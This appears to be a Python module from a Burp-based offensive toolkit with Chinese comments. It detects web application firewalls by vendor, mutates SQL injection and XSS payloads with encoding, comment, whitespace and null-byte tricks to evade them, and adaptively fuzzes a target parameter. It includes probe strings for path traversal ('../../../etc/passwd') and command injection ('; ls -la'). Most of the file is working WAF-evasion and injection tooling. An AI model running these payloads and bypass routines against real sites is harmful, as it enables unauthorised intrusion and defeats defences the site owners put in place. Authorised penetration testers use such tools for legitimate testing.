"""
AI-Burp 智能 Payload 生成器 v1.0.0

功能:
1. WAF 检测与识别
2. 自适应 Payload 生成
3. WAF 绕过策略
4. 响应分析与调整

用法:
    # CLI
    aiburp smart-fuzz https://target.com/search q test --waf-bypass
    aiburp waf-detect https://target.com
    
    # Python API
    from aiburp.smart_payload import SmartPayloadGenerator
    
    spg = SmartPayloadGenerator(burp)
    waf = spg.detect_waf("https://target.com")
    payloads = spg.generate_bypass_payloads("sqli", waf_type=waf)
"""

import re
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from enum import Enum


class WAFType(Enum):
    NONE = "none"
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    AWS_WAF = "aws_waf"
    IMPERVA = "imperva"
    SUCURI = "sucuri"
    MODSECURITY = "modsecurity"
    F5_BIG_IP = "f5_bigip"
    FORTINET = "fortinet"
    BARRACUDA = "barracuda"
    CITRIX = "citrix"
    UNKNOWN = "unknown"


@dataclass
class WAFDetectionResult:
    """WAF 检测结果"""
    detected: bool = False
    waf_type: WAFType = WAFType.NONE
    confidence: float = 0.0
    evidence: List[str] = field(default_factory=list)
    headers: Dict[str, str] = field(default_factory=dict)
    
    def __str__(self) -> str:
        if not self.detected:
            return "✅ 未检测到 WAF"
        return f"🛡️ 检测到 WAF: {self.waf_type.value} (置信度: {self.confidence:.0%})"


# WAF 指纹库
WAF_SIGNATURES = {
    WAFType.CLOUDFLARE: {
        "headers": ["cf-ray", "cf-cache-status", "__cfduid", "cf-request-id"],
        "cookies": ["__cfduid", "__cf_bm"],
        "body": ["cloudflare", "attention required", "ray id"],
        "status": [403, 503],
    },
    WAFType.AKAMAI: {
        "headers": ["x-akamai", "akamai-origin-hop", "akamai-grn"],
        "cookies": ["akamai", "ak_bmsc"],
        "body": ["akamai", "reference #"],
        "status": [403],
    },
    WAFType.AWS_WAF: {
        "headers": ["x-amzn-requestid", "x-amz-cf-id"],
        "cookies": ["awsalb", "awsalbcors"],
        "body": ["aws", "request blocked"],
        "status": [403],
    },
    WAFType.IMPERVA: {
        "headers": ["x-iinfo", "x-cdn"],
        "cookies": ["incap_ses", "visid_incap", "nlbi_"],
        "body": ["incapsula", "incident id"],
        "status": [403],
    },
    WAFType.SUCURI: {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "cookies": ["sucuri"],
        "body": ["sucuri", "access denied", "sucuri website firewall"],
        "status": [403],
    },
    WAFType.MODSECURITY: {
        "headers": ["mod_security", "modsecurity"],
        "body": ["mod_security", "modsecurity", "not acceptable", "406 not acceptable"],
        "status": [403, 406],
    },
    WAFType.F5_BIG_IP: {
        "headers": ["x-wa-info", "x-cnection"],
        "cookies": ["bigipserver", "ts", "f5"],
        "body": ["f5 networks", "big-ip", "the requested url was rejected"],
        "status": [403],
    },
    WAFType.FORTINET: {
        "headers": ["fortigate", "fortiwafs"],
        "cookies": ["fortiwaf"],
        "body": ["fortigate", "fortiweb", "web page blocked"],
        "status": [403],
    },
    WAFType.BARRACUDA: {
        "headers": ["barra_counter_session"],
        "cookies": ["barra_counter_session"],
        "body": ["barracuda", "you have been blocked"],
        "status": [403],
    },
    WAFType.CITRIX: {
        "headers": ["ns_af", "citrix_ns_id"],
        "cookies": ["citrix_ns_id", "ns_af"],
        "body": ["citrix", "netscaler", "access denied"],
        "status": [403],
    },
}

# 绕过技术
BYPASS_TECHNIQUES = {
    "encoding": {
        "url": lambda p: p.replace(" ", "%20").replace("'", "%27").replace('"', "%22"),
        "double_url": lambda p: p.replace(" ", "%2520").replace("'", "%2527"),
        "unicode": lambda p: p.replace("'", "\\u0027").replace('"', "\\u0022"),
        "hex": lambda p: "".join(f"%{ord(c):02x}" if c in "' \"<>" else c for c in p),
    },
    "case": {
        "upper": lambda p: p.upper(),
        "lower": lambda p: p.lower(),
        "mixed": lambda p: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)),
        "random": lambda p: "".join(c.upper() if hash(c) % 2 else c.lower() for c in p),
    },
    "comment": {
        "inline": lambda p: p.replace(" ", "/**/"),
        "mysql": lambda p: p.replace(" ", "/*!*/"),
        "hash": lambda p: p.replace(" ", "#\n"),
    },
    "whitespace": {
        "tab": lambda p: p.replace(" ", "\t"),
        "newline": lambda p: p.replace(" ", "\n"),
        "carriage": lambda p: p.replace(" ", "\r"),
        "vertical_tab": lambda p: p.replace(" ", "\x0b"),
        "form_feed": lambda p: p.replace(" ", "\x0c"),
        "url_tab": lambda p: p.replace(" ", "%09"),
        "url_newline": lambda p: p.replace(" ", "%0a"),
    },
    "null_byte": {
        "prefix": lambda p: f"%00{p}",
        "suffix": lambda p: f"{p}%00",
        "inline": lambda p: p.replace(" ", "%00"),
    },
}

# 基础 SQLi Payload
SQLI_BASE_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "1' AND '1'='1",
    "1 AND 1=1",
    "1 UNION SELECT NULL",
    "' UNION SELECT NULL--",
    "1; SELECT 1",
    "1' AND SLEEP(3)--",
    "1' WAITFOR DELAY '0:0:3'--",
]

# 基础 XSS Payload
XSS_BASE_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "'-alert(1)-'",
    "\"><script>alert(1)</script>",
]


class SmartPayloadGenerator:
    """
    智能 Payload 生成器
    
    用法:
        spg = SmartPayloadGenerator(burp)
        
        # 检测 WAF
        waf = spg.detect_waf("https://target.com")
        print(waf)  # 🛡️ 检测到 WAF: cloudflare (置信度: 85%)
        
        # 生成绕过 payload
        payloads = spg.generate_bypass_payloads("sqli", waf_type=waf.waf_type)
        
        # 自适应 fuzz
        results = spg.adaptive_fuzz("https://target.com/search", "q", "test")
    """
    
    def __init__(self, burp):
        self.burp = burp
    
    def _send_param(self, url: str, param: str, value: str, method: str = "GET"):
        """发送带参数的请求"""
        import urllib.parse
        if method.upper() == "GET":
            full_url = f"{url}?{param}={urllib.parse.quote(str(value))}"
            return self.burp.get(full_url)
        else:
            return self.burp.post(url, data={param: value})
    
    def detect_waf(self, url: str) -> WAFDetectionResult:
        """
        检测 WAF
        
        发送正常请求和恶意请求，对比响应来检测 WAF
        """
        result = WAFDetectionResult()
        
        # 1. 正常请求
        normal_r = self.burp.get(url)
        if not normal_r.ok:
            return result
        
        # 检查响应头
        headers_lower = {k.lower(): v for k, v in normal_r.headers.items()}
        result.headers = dict(normal_r.headers)
        
        # 2. 发送恶意请求触发 WAF
        malicious_payloads = [
            "' OR 1=1--",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "; ls -la",
        ]
        
        waf_scores: Dict[WAFType, float] = {}
        
        for payload in malicious_payloads:
            test_url = f"{url}?test={payload}"
            r = self.burp.get(test_url)
            time.sleep(self.burp.delay)
            
            # 检查每种 WAF 的特征
            for waf_type, signatures in WAF_SIGNATURES.items():
                score = 0.0
                evidence = []
                
                # 检查响应头
                for header in signatures.get("headers", []):
                    if header.lower() in headers_lower:
                        score += 0.3
                        evidence.append(f"Header: {header}")
                
                # 检查 Cookie
                for cookie in signatures.get("cookies", []):
                    if cookie.lower() in str(r.headers).lower():
                        score += 0.2
                        evidence.append(f"Cookie: {cookie}")
                
                # 检查响应体
                body_lower = r.body.lower()
                for pattern in signatures.get("body", []):
                    if pattern.lower() in body_lower:
                        score += 0.3
                        evidence.append(f"Body: {pattern}")
                
                # 检查状态码
                if r.status in signatures.get("status", []):
                    score += 0.2
                    evidence.append(f"Status: {r.status}")
                
                if score > 0:
                    waf_scores[waf_type] = waf_scores.get(waf_type, 0) + score
                    result.evidence.extend(evidence)
        
        # 确定 WAF 类型
        if waf_scores:
            best_match = max(waf_scores.items(), key=lambda x: x[1])
            if best_match[1] >= 0.3:
                result.detected = True
                result.waf_type = best_match[0]
                result.confidence = min(best_match[1], 1.0)
        
        # 如果检测到拦截但无法识别类型
        if not result.detected:
            for payload in malicious_payloads:
                test_url = f"{url}?test={payload}"
                r = self.burp.get(test_url)
                if r.status in [403, 406, 429, 503] or r.blocked:
                    result.detected = True
                    result.waf_type = WAFType.UNKNOWN
                    result.confidence = 0.5
                    result.evidence.append(f"Blocked with status {r.status}")
                    break
                time.sleep(self.burp.delay)
        
        return result

    
    def generate_bypass_payloads(
        self,
        vuln_type: str = "sqli",
        waf_type: WAFType = WAFType.NONE,
        base_payloads: List[str] = None
    ) -> List[str]:
        """
        生成 WAF 绕过 payload
        
        Args:
            vuln_type: 漏洞类型 (sqli/xss)
            waf_type: WAF 类型
            base_payloads: 基础 payload 列表
        
        Returns:
            绕过 payload 列表
        """
        if base_payloads is None:
            if vuln_type == "sqli":
                base_payloads = SQLI_BASE_PAYLOADS
            elif vuln_type == "xss":
                base_payloads = XSS_BASE_PAYLOADS
            else:
                base_payloads = SQLI_BASE_PAYLOADS
        
        payloads = list(base_payloads)
        
        # 根据 WAF 类型选择绕过技术
        techniques = self._get_bypass_techniques(waf_type)
        
        for base in base_payloads:
            for tech_name, tech_func in techniques:
                try:
                    bypassed = tech_func(base)
                    if bypassed != base and bypassed not in payloads:
                        payloads.append(bypassed)
                except:
                    pass
        
        return payloads
    
    def _get_bypass_techniques(self, waf_type: WAFType) -> List[Tuple[str, callable]]:
        """根据 WAF 类型获取绕过技术"""
        techniques = []
        
        # 通用技术
        techniques.extend([
            ("url_encode", BYPASS_TECHNIQUES["encoding"]["url"]),
            ("inline_comment", BYPASS_TECHNIQUES["comment"]["inline"]),
            ("tab_space", BYPASS_TECHNIQUES["whitespace"]["tab"]),
            ("mixed_case", BYPASS_TECHNIQUES["case"]["mixed"]),
        ])
        
        # WAF 特定技术
        if waf_type == WAFType.CLOUDFLARE:
            techniques.extend([
                ("double_url", BYPASS_TECHNIQUES["encoding"]["double_url"]),
                ("newline", BYPASS_TECHNIQUES["whitespace"]["newline"]),
            ])
        elif waf_type == WAFType.MODSECURITY:
            techniques.extend([
                ("mysql_comment", BYPASS_TECHNIQUES["comment"]["mysql"]),
                ("null_byte", BYPASS_TECHNIQUES["null_byte"]["inline"]),
            ])
        elif waf_type == WAFType.AWS_WAF:
            techniques.extend([
                ("unicode", BYPASS_TECHNIQUES["encoding"]["unicode"]),
                ("url_newline", BYPASS_TECHNIQUES["whitespace"]["url_newline"]),
            ])
        elif waf_type == WAFType.IMPERVA:
            techniques.extend([
                ("hex", BYPASS_TECHNIQUES["encoding"]["hex"]),
                ("hash_comment", BYPASS_TECHNIQUES["comment"]["hash"]),
            ])
        else:
            # 未知 WAF，尝试所有技术
            for category in BYPASS_TECHNIQUES.values():
                for name, func in category.items():
                    techniques.append((name, func))
        
        return techniques
    
    def adaptive_fuzz(
        self,
        url: str,
        param: str,
        value: str,
        vuln_type: str = "sqli",
        max_payloads: int = 50
    ) -> List[dict]:
        """
        自适应 Fuzz
        
        根据响应自动调整策略
        
        Args:
            url: 目标 URL
            param: 参数名
            value: 原始值
            vuln_type: 漏洞类型
            max_payloads: 最大 payload 数
        
        Returns:
            测试结果列表
        """
        results = []
        
        # 1. 检测 WAF
        print(f"🔍 检测 WAF...")
        waf_result = self.detect_waf(url)
        print(f"   {waf_result}")
        
        # 2. 获取基线
        print(f"📊 获取基线...")
        baseline = self._send_param(url, param, value, "GET")
        print(f"   基线: [{baseline.status}] {baseline.length}b {baseline.time_ms:.0f}ms")
        
        # 3. 生成 payload
        print(f"🎯 生成绕过 payload...")
        payloads = self.generate_bypass_payloads(vuln_type, waf_result.waf_type)
        payloads = payloads[:max_payloads]
        print(f"   生成 {len(payloads)} 个 payload")
        
        # 4. 测试
        print(f"\n📋 开始测试:")
        blocked_count = 0
        interesting_count = 0
        
        for i, payload in enumerate(payloads, 1):
            test_value = f"{value}{payload}"
            r = self._send_param(url, param, test_value, "GET")
            
            result = {
                "payload": payload,
                "status": r.status,
                "length": r.length,
                "time_ms": r.time_ms,
                "blocked": r.blocked,
                "error": r.error,
                "interesting": False,
            }
            
            # 分析响应
            if r.blocked:
                blocked_count += 1
                result["note"] = "被拦截"
            elif r.error:
                result["interesting"] = True
                result["note"] = f"触发错误: {r.error}"
                interesting_count += 1
            elif abs(r.length - baseline.length) > 100:
                result["interesting"] = True
                result["note"] = f"响应变化: {r.length - baseline.length:+d}b"
                interesting_count += 1
            elif r.time_ms > baseline.time_ms + 2000:
                result["interesting"] = True
                result["note"] = f"时间延迟: +{r.time_ms - baseline.time_ms:.0f}ms"
                interesting_count += 1
            
            results.append(result)
            
            # 打印进度
            if result.get("interesting"):
                print(f"   [{i}/{len(payloads)}] ⚠️ {payload[:40]}... → {result.get('note', '')}")
            elif r.blocked:
                pass  # 不打印被拦截的
            
            # 自适应调整
            if blocked_count >= 5 and blocked_count > len(results) * 0.5:
                print(f"\n   ⚠️ 拦截率过高 ({blocked_count}/{len(results)}), 降低速度...")
                self.burp.delay = min(self.burp.delay * 2, 5.0)
            
            time.sleep(self.burp.delay)
        
        # 5. 总结
        print(f"\n{'='*50}")
        print(f"📊 测试完成")
        print(f"   总计: {len(results)} | 有趣: {interesting_count} | 拦截: {blocked_count}")
        print(f"{'='*50}")
        
        return results
    
    def test_bypass(
        self,
        url: str,
        param: str,
        value: str,
        payload: str
    ) -> dict:
        """
        测试单个绕过 payload
        
        尝试多种编码方式
        """
        results = []
        
        # 原始
        r = self._send_param(url, param, f"{value}{payload}", "GET")
        results.append({"technique": "original", "blocked": r.blocked, "status": r.status})
        
        if r.blocked:
            # 尝试绕过
            for category, techniques in BYPASS_TECHNIQUES.items():
                for name, func in techniques.items():
                    try:
                        bypassed = func(payload)
                        r = self._send_param(url, param, f"{value}{bypassed}", "GET")
                        results.append({
                            "technique": f"{category}/{name}",
                            "payload": bypassed,
                            "blocked": r.blocked,
                            "status": r.status,
                        })
                        
                        if not r.blocked:
                            return {
                                "success": True,
                                "technique": f"{category}/{name}",
                                "payload": bypassed,
                                "status": r.status,
                            }
                        
                        time.sleep(self.burp.delay)
                    except:
                        pass
        
        return {
            "success": not r.blocked,
            "technique": "original" if not r.blocked else None,
            "payload": payload,
            "attempts": results,
        }


# 便捷函数
def detect_waf(burp, url: str) -> WAFDetectionResult:
    """快速检测 WAF"""
    spg = SmartPayloadGenerator(burp)
    return spg.detect_waf(url)


def generate_bypass(vuln_type: str, waf_type: str = "unknown") -> List[str]:
    """快速生成绕过 payload"""
    waf = WAFType(waf_type) if waf_type in [w.value for w in WAFType] else WAFType.UNKNOWN
    spg = SmartPayloadGenerator(None)
    return spg.generate_bypass_payloads(vuln_type, waf)
